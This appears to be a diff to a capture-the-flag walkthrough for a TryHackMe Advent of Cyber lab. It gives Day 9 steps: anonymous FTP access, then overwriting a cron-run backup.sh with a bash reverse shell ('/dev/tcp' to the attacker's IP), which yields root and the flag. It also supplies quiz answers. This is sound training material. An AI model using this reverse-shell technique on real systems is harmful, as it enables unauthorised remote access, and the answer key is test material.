@@ -65,4 +65,14 @@ Room Link: https://tryhackme.com/room/adventofcyber2
 4. From the ‘sudo nmap -sV <IP>’ result we can view that on the port 2222 ubuntu variant of Linux server is running 
 5. On the scan ‘sudo nmap -A <IP>’ under port 80 you can see the HTTP-TITLE as ‘Internal Blog’ - so the website is based on Blog format
 
-## Day 9 Solution Steps: typing ...
+## Day 9 Solution Steps: Anyone can be Santa!
+1. Connect with the target ftp server IP using the command ‘ftp <IP>’ for the username provide anonymous and it won’t ask for the password 
+2. Navigate to the ‘public’ dir with command ‘cd public’ and download the two files using the command ‘get backup.sh’ and ‘get shoppinglist.txt’ - both the file will be downloaded to our local machine
+3. Open both the file and analysis the same - in the file backup.sh it written that this file will be executed for every minute and the final backup will be done at the end of the day
+4. Replace the content in the ‘backup.sh’ with the bash reverse shell comment ‘bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1’ to get the shell on the machine 
+5. For the 1st question the answer is ‘public’ same as the directory we got these details 
+6. For the 2nd question the answer is ‘backup.sh’ as we know this file is running every minutes 
+7. Open the shoppinglist.txt and paste the same for the question 3 
+8. Listen via netcat on you local machine once the connection established - cat /root/flag.txt and paste the same for the question 4
+
+## Day 10 Solution Steps: typing ...
